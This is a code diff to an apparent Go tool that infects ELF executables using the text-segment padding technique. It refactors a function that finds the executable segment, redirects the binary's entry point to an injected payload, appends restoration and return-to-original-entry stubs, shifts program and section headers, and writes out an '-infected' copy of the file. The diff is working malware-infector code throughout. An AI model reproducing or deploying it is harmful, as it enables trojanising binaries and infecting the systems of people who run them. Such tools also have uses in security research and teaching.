@@ -6,10 +6,11 @@ import (
 	"encoding/binary"
 	"fmt"
 	"io/ioutil"
+	"errors"
 )
 
 const (
-	PAGE_SIZE                       int    = 4096
+	PAGE_SIZE                       int    = 0x1000
 	MOD_ENTRY_POINT                 string = "[+] Modified entry point from 0x%x -> 0x%x\n"
 	TEXT_SEG_START                  string = "[+] Text segment starts @ 0x%x\n"
 	TEXT_SEG_END                    string = "[+] Text segment ends @ 0x%x\n"
@@ -22,12 +23,20 @@ const (
 	INCREASE_SECTION_HEADER_ADDRESS string = "[+] Increasing section header addresses if they come after text segment"
 	UPDATE_SECTIONS_PAST_TEXT_SEG   string = "[+] (%d) Updating sections past text section @ addr 0x%x\n"
 	EXTEND_SECTION_HEADER_ENTRY     string = "[+] Extending section header entry for text section by payload len."
+	ERROR_NO_TEXT_SEG               string = "[-] No text segment found in target binary possibly corrupted\n"
+
 )
+
 
 func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) error {
 	var textSegEnd interface{}
 	var oShoff interface{}
-	var textNdx int
+	
+	textNdx := t.impNdx.textNdx
+
+	if textNdx == 0 {
+		return errors.New(ERROR_NO_TEXT_SEG)	
+	}
 
 	switch t.EIdent.Arch {
 	case elf.ELFCLASS64:
@@ -36,52 +45,46 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 
 		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
 		pHeaders := t.Phdrs.([]elf.Prog64)
-		pNum := int(t.Hdr.(*elf.Header64).Phnum)
+		
+		t.Hdr.(*elf.Header64).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+		if debug {
+			fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
+		}
 
-		for i := 0; i < pNum; i++ {
-			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
-				textNdx = i
-				t.Hdr.(*elf.Header64).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
-				if debug {
-					fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
-				}
+		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
+		if debug {
+			fmt.Printf(TEXT_SEG_START, pHeaders[textNdx].Off)
+			fmt.Printf(TEXT_SEG_END, textSegEnd.(uint64))
+			fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
+		}
 
-				textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
-				if debug {
-					fmt.Printf(TEXT_SEG_START, pHeaders[i].Off)
-					fmt.Printf(TEXT_SEG_END, textSegEnd.(uint64))
-					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
-				}
+		if !((opts & NoRest) == NoRest)  {
+			t.Payload.Write(restoration64)
+		}
 
-				if !((opts & NoRest) == NoRest)  {
-					t.Payload.Write(restoration64)
-				}
+		if !((opts & NoRetOEP) == NoRetOEP) {
+			retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
+			t.Payload.Write(retStub)
+		}
 
-				if !((opts & NoRetOEP) == NoRetOEP) {
-					retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
-					t.Payload.Write(retStub)
-				}
+		if debug {
+			fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+			printPayload(t.Payload.Bytes())
+		}
 
-				if debug {
-					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
-					printPayload(t.Payload.Bytes())
-				}
+		t.Phdrs.([]elf.Prog64)[textNdx].Memsz += uint64(t.Payload.Len())
+		t.Phdrs.([]elf.Prog64)[textNdx].Filesz += uint64(t.Payload.Len())
 
-				t.Phdrs.([]elf.Prog64)[i].Memsz += uint64(t.Payload.Len())
-				t.Phdrs.([]elf.Prog64)[i].Filesz += uint64(t.Payload.Len())
-
-				if debug {
-					fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
-					fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
-				}
-			}
+		if debug {
+			fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
+			fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
 		}
 
 		if debug {
 			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
 		}
 
-		for j := textNdx; j < pNum; j++ {
+		for j := textNdx; j < len(pHeaders); j++ {
 			if pHeaders[textNdx].Off < pHeaders[j].Off {
 				if debug {
 					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
@@ -116,52 +119,47 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 
 		t.Hdr.(*elf.Header32).Shoff += uint32(PAGE_SIZE)
 		pHeaders := t.Phdrs.([]elf.Prog32)
-		pNum := int(t.Hdr.(*elf.Header32).Phnum)
-
-		for i := 0; i < pNum; i++ {
-			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
-				textNdx = i
-				t.Hdr.(*elf.Header32).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
-				if debug {
-					fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
-				}
-
-				textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
-				if debug {
-					fmt.Printf(TEXT_SEG_START, pHeaders[i].Off)
-					fmt.Printf(TEXT_SEG_END, textSegEnd.(uint32))
-					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
-				}
-
-				if !((opts & NoRest) == NoRest) {
-					t.Payload.Write(restoration32)
-				}
-
-				if !((opts & NoRetOEP) == NoRetOEP) {
-					retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header32).Entry, oEntry)
-					t.Payload.Write(retStub)
-				}
-
-				if debug {
-					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
-					printPayload(t.Payload.Bytes())
-				}
-
-				t.Phdrs.([]elf.Prog32)[i].Memsz += uint32(t.Payload.Len())
-				t.Phdrs.([]elf.Prog32)[i].Filesz += uint32(t.Payload.Len())
-
-				if debug {
-					fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
-					fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
-				}
-			}
+		
+		t.Hdr.(*elf.Header32).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+		if debug {
+			fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
 		}
 
+		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
+		if debug {
+			fmt.Printf(TEXT_SEG_START, pHeaders[textNdx].Off)
+			fmt.Printf(TEXT_SEG_END, textSegEnd.(uint32))
+			fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
+		}
+
+		if !((opts & NoRest) == NoRest) {
+				t.Payload.Write(restoration32)
+		}
+
+		if !((opts & NoRetOEP) == NoRetOEP) {
+			retStub := modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header32).Entry, oEntry)
+			t.Payload.Write(retStub)
+		}
+
+		if debug {
+			fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+			printPayload(t.Payload.Bytes())
+		}
+
+		t.Phdrs.([]elf.Prog32)[textNdx].Memsz += uint32(t.Payload.Len())
+		t.Phdrs.([]elf.Prog32)[textNdx].Filesz += uint32(t.Payload.Len())
+
+		if debug {
+			fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
+			fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
+		}	
+
+		
 		if debug {
 			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
 		}
 
-		for j := textNdx; j < pNum; j++ {
+		for j := textNdx; j < len(pHeaders); j++ {
 			if pHeaders[textNdx].Off < pHeaders[j].Off {
 				if debug {
 					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
@@ -220,9 +218,9 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 	var ephdrsz int
 	switch t.EIdent.Arch {
 	case elf.ELFCLASS64:
-		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize*t.Hdr.(*elf.Header64).Phnum)
+		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize * t.Hdr.(*elf.Header64).Phnum)
 	case elf.ELFCLASS32:
-		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize*t.Hdr.(*elf.Header32).Phnum)
+		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize * t.Hdr.(*elf.Header32).Phnum)
 	}
 
 	infected.Write(t.Contents[ephdrsz:])
@@ -235,7 +233,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
 	}
 
-	finalInfectionTwo := make([]byte, infected.Len()+int(PAGE_SIZE))
+	finalInfectionTwo := make([]byte, infected.Len() + int(PAGE_SIZE))
 	finalInfection := infected.Bytes()
 
 	var endOfInfection int
@@ -255,7 +253,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 	}
 
 	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
-	copy(finalInfectionTwo[endOfInfection+PAGE_SIZE:], finalInfection[endOfInfection:])
+	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
 	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())
 
 	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
